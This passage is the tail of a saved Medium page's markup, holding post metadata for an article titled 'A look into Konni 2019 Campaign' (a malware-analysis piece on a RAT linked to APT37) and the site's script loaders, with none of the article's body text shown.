717a7_14"},{"__ref":"Paragraph:4a39df3717a7_15"},{"__ref":"Paragraph:4a39df3717a7_16"},{"__ref":"Paragraph:4a39df3717a7_17"},{"__ref":"Paragraph:4a39df3717a7_18"},{"__ref":"Paragraph:4a39df3717a7_19"},{"__ref":"Paragraph:4a39df3717a7_20"},{"__ref":"Paragraph:4a39df3717a7_21"},{"__ref":"Paragraph:4a39df3717a7_22"},{"__ref":"Paragraph:4a39df3717a7_23"},{"__ref":"Paragraph:4a39df3717a7_24"},{"__ref":"Paragraph:4a39df3717a7_25"},{"__ref":"Paragraph:4a39df3717a7_26"},{"__ref":"Paragraph:4a39df3717a7_27"},{"__ref":"Paragraph:4a39df3717a7_28"},{"__ref":"Paragraph:4a39df3717a7_29"},{"__ref":"Paragraph:4a39df3717a7_30"},{"__ref":"Paragraph:4a39df3717a7_31"},{"__ref":"Paragraph:4a39df3717a7_32"},{"__ref":"Paragraph:4a39df3717a7_33"},{"__ref":"Paragraph:4a39df3717a7_34"},{"__ref":"Paragraph:4a39df3717a7_35"},{"__ref":"Paragraph:4a39df3717a7_36"},{"__ref":"Paragraph:4a39df3717a7_37"},{"__ref":"Paragraph:4a39df3717a7_38"},{"__ref":"Paragraph:4a39df3717a7_39"},{"__ref":"Paragraph:4a39df3717a7_40"},{"__ref":"Paragraph:4a39df3717a7_41"},{"__ref":"Paragraph:4a39df3717a7_42"},{"__ref":"Paragraph:4a39df3717a7_43"},{"__ref":"Paragraph:4a39df3717a7_44"},{"__ref":"Paragraph:4a39df3717a7_45"},{"__ref":"Paragraph:4a39df3717a7_46"},{"__ref":"Paragraph:4a39df3717a7_47"},{"__ref":"Paragraph:4a39df3717a7_48"},{"__ref":"Paragraph:4a39df3717a7_49"},{"__ref":"Paragraph:4a39df3717a7_50"},{"__ref":"Paragraph:4a39df3717a7_51"},{"__ref":"Paragraph:4a39df3717a7_52"},{"__ref":"Paragraph:4a39df3717a7_53"},{"__ref":"Paragraph:4a39df3717a7_54"},{"__ref":"Paragraph:4a39df3717a7_55"},{"__ref":"Paragraph:4a39df3717a7_56"},{"__ref":"Paragraph:4a39df3717a7_57"},{"__ref":"Paragraph:4a39df3717a7_58"},{"__ref":"Paragraph:4a39df3717a7_59"},{"__ref":"Paragraph:4a39df3717a7_60"},{"__ref":"Paragraph:4a39df3717a7_61"},{"__ref":"Paragraph:4a39df3717a7_62"},{"__ref":"Paragraph:4a39df3717a7_63"},{"__ref":"Paragraph:4a39df3717a7_64"},{"__ref":"Paragraph:4a39df3717a7_65"},{"__ref":"Paragraph:4a39df3717a7_66"},{"__ref":"Paragraph:4a39df3717a7_67"},{"__ref":"Paragraph:4a39df3717a7_68"},{"__ref":"Paragraph:4a39df3717a7_69"},{"__ref":"Paragraph:4a39df3717a7_70"},{"__ref":"Paragraph:4a39df3717a7_71"},{"__ref":"Paragraph:4a39df3717a7_72"},{"__ref":"Paragraph:4a39df3717a7_73"},{"__ref":"Paragraph:4a39df3717a7_74"},{"__ref":"Paragraph:4a39df3717a7_75"},{"__ref":"Paragraph:4a39df3717a7_76"},{"__ref":"Paragraph:4a39df3717a7_77"},{"__ref":"Paragraph:4a39df3717a7_78"},{"__ref":"Paragraph:4a39df3717a7_79"},{"__ref":"Paragraph:4a39df3717a7_80"},{"__ref":"Paragraph:4a39df3717a7_81"},{"__ref":"Paragraph:4a39df3717a7_82"},{"__ref":"Paragraph:4a39df3717a7_83"},{"__ref":"Paragraph:4a39df3717a7_84"},{"__ref":"Paragraph:4a39df3717a7_85"},{"__ref":"Paragraph:4a39df3717a7_86"},{"__ref":"Paragraph:4a39df3717a7_87"},{"__ref":"Paragraph:4a39df3717a7_88"},{"__ref":"Paragraph:4a39df3717a7_89"},{"__ref":"Paragraph:4a39df3717a7_90"},{"__ref":"Paragraph:4a39df3717a7_91"},{"__ref":"Paragraph:4a39df3717a7_92"},{"__ref":"Paragraph:4a39df3717a7_93"},{"__ref":"Paragraph:4a39df3717a7_94"},{"__ref":"Paragraph:4a39df3717a7_95"},{"__ref":"Paragraph:4a39df3717a7_96"},{"__ref":"Paragraph:4a39df3717a7_97"},{"__ref":"Paragraph:4a39df3717a7_98"},{"__ref":"Paragraph:4a39df3717a7_99"},{"__ref":"Paragraph:4a39df3717a7_100"},{"__ref":"Paragraph:4a39df3717a7_101"},{"__ref":"Paragraph:4a39df3717a7_102"},{"__ref":"Paragraph:4a39df3717a7_103"},{"__ref":"Paragraph:4a39df3717a7_104"},{"__ref":"Paragraph:4a39df3717a7_105"},{"__ref":"Paragraph:4a39df3717a7_106"},{"__ref":"Paragraph:4a39df3717a7_107"},{"__ref":"Paragraph:4a39df3717a7_108"},{"__ref":"Paragraph:4a39df3717a7_109"},{"__ref":"Paragraph:4a39df3717a7_110"},{"__ref":"Paragraph:4a39df3717a7_111"},{"__ref":"Paragraph:4a39df3717a7_112"},{"__ref":"Paragraph:4a39df3717a7_113"},{"__ref":"Paragraph:4a39df3717a7_114"},{"__ref":"Paragraph:4a39df3717a7_115"},{"__ref":"Paragraph:4a39df3717a7_116"},{"__ref":"Paragraph:4a39df3717a7_117"},{"__ref":"Paragraph:4a39df3717a7_118"},{"__ref":"Paragraph:4a39df3717a7_119"},{"__ref":"Paragraph:4a39df3717a7_120"},{"__ref":"Paragraph:4a39df3717a7_121"},{"__ref":"Paragraph:4a39df3717a7_122"},{"__ref":"Paragraph:4a39df3717a7_123"},{"__ref":"Paragraph:4a39df3717a7_124"},{"__ref":"Paragraph:4a39df3717a7_125"},{"__ref":"Paragraph:4a39df3717a7_126"},{"__ref":"Paragraph:4a39df3717a7_127"},{"__ref":"Paragraph:4a39df3717a7_128"},{"__ref":"Paragraph:4a39df3717a7_129"},{"__ref":"Paragraph:4a39df3717a7_130"},{"__ref":"Paragraph:4a39df3717a7_131"},{"__ref":"Paragraph:4a39df3717a7_132"},{"__ref":"Paragraph:4a39df3717a7_133"},{"__ref":"Paragraph:4a39df3717a7_134"},{"__ref":"Paragraph:4a39df3717a7_135"},{"__ref":"Paragraph:4a39df3717a7_136"},{"__ref":"Paragraph:4a39df3717a7_137"},{"__ref":"Paragraph:4a39df3717a7_138"},{"__ref":"Paragraph:4a39df3717a7_139"},{"__ref":"Paragraph:4a39df3717a7_140"},{"__ref":"Paragraph:4a39df3717a7_141"},{"__ref":"Paragraph:4a39df3717a7_142"},{"__ref":"Paragraph:4a39df3717a7_143"},{"__ref":"Paragraph:4a39df3717a7_144"},{"__ref":"Paragraph:4a39df3717a7_145"},{"__ref":"Paragraph:4a39df3717a7_146"},{"__ref":"Paragraph:4a39df3717a7_147"},{"__ref":"Paragraph:4a39df3717a7_148"},{"__ref":"Paragraph:4a39df3717a7_149"},{"__ref":"Paragraph:4a39df3717a7_150"},{"__ref":"Paragraph:4a39df3717a7_151"},{"__ref":"Paragraph:4a39df3717a7_152"},{"__ref":"Paragraph:4a39df3717a7_153"},{"__ref":"Paragraph:4a39df3717a7_154"},{"__ref":"Paragraph:4a39df3717a7_155"},{"__ref":"Paragraph:4a39df3717a7_156"},{"__ref":"Paragraph:4a39df3717a7_157"},{"__ref":"Paragraph:4a39df3717a7_158"},{"__ref":"Paragraph:4a39df3717a7_159"},{"__ref":"Paragraph:4a39df3717a7_160"},{"__ref":"Paragraph:4a39df3717a7_161"},{"__ref":"Paragraph:4a39df3717a7_162"},{"__ref":"Paragraph:4a39df3717a7_163"},{"__ref":"Paragraph:4a39df3717a7_164"},{"__ref":"Paragraph:4a39df3717a7_165"},{"__ref":"Paragraph:4a39df3717a7_166"},{"__ref":"Paragraph:4a39df3717a7_167"}]},"validatedShareKey":"","shareKeyCreator":null},"creator":{"__ref":"User:36b231b019fe"},"inResponseToEntityType":null,"isLocked":false,"isMarkedPaywallOnly":false,"lockedSource":"LOCKED_POST_SOURCE_NONE","mediumUrl":"https:\u002F\u002Fmedium.com\u002Fd-hunter\u002Fa-look-into-konni-2019-campaign-b45a0f321e9b","primaryTopic":null,"topics":[{"__typename":"Topic","slug":"cybersecurity"}],"isPublished":true,"latestPublishedVersion":"4a39df3717a7","visibility":"PUBLIC","postResponses":{"__typename":"PostResponses","count":0},"clapCount":2,"allowResponses":true,"isLimitedState":false,"title":"A look into Konni 2019 Campaign","isSeries":false,"sequence":null,"uniqueSlug":"a-look-into-konni-2019-campaign-b45a0f321e9b","socialTitle":"","socialDek":"","canonicalUrl":"","metaDescription":"","latestPublishedAt":1578473412163,"readingTime":10.633962264150943,"previewContent":{"__typename":"PreviewContent","subtitle":"Konni is a remote administration tool, observed in the wild since early 2014. The Konni malware family is potentially linked to APT37"},"previewImage":{"__ref":"ImageMetadata:1*CfSltI6XAjK-X9tb9J2FvQ.png"},"isShortform":false,"seoTitle":"Threat Spotlight: Konni Malware 2019 Campaign ","firstPublishedAt":1578165400442,"updatedAt":1639369128573,"shortformType":"SHORTFORM_TYPE_LINK","seoDescription":"Konni is a remote administration tool, observed in the wild since early 2014. The Konni malware family is potentially linked to APT37, a North-Korean cyber espionage group active since 2012 ","viewerEdge":{"__ref":"PostViewerEdge:postId:b45a0f321e9b-viewerId:lo_3fc4c66d8421"},"isSuspended":false,"license":"ALL_RIGHTS_RESERVED","tags":[{"__ref":"Tag:malware"},{"__ref":"Tag:malware-analysis"},{"__ref":"Tag:threat-hunting"},{"__ref":"Tag:threat-intelligence"},{"__ref":"Tag:cybersecurity"}],"isNewsletter":false,"statusForCollection":"APPROVED","pendingCollection":null,"detectedLanguage":"en","wordCount":2182,"layerCake":0}}</script><script>window.__MIDDLEWARE_STATE__={"session":{"xsrf":""},"cache":{"cacheStatus":"MISS"}}</script><script src="https://cdn-client.medium.com/lite/static/js/manifest.7e50e797.js"></script><script src="https://cdn-client.medium.com/lite/static/js/9865.1496d74a.js"></script><script src="https://cdn-client.medium.com/lite/static/js/main.018e7ca9.js"></script><script src="https://cdn-client.medium.com/lite/static/js/instrumentation.d9108df7.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/reporting.ff22a7a5.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9120.5df29668.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5049.d1ead72d.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4810.6318add7.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6618.db187378.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/1386.6a7a21a1.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9977.84e4bd5c.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/719.ae4dd3e0.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5250.9f9e01d2.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6349.b071a958.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2648.26563adf.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8393.826a25fb.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/1443.598cb8b2.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3735.8c38ede2.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5642.d10c9ba0.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6546.cd03f950.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6834.08de95de.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/1781.db373833.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2420.0330d157.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/839.ca7937c2.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7975.d195c6f1.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2106.21ff89d3.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7394.55c925ce.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2961.00a48598.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/230.4d7a2738.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4391.59acaed3.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/PostPage.MainContent.563d0db5.chunk.js"></script><script>window.main();</script><script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'8d764c8d6868e01c',t:'MTcyOTczNDQ0OS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body></html>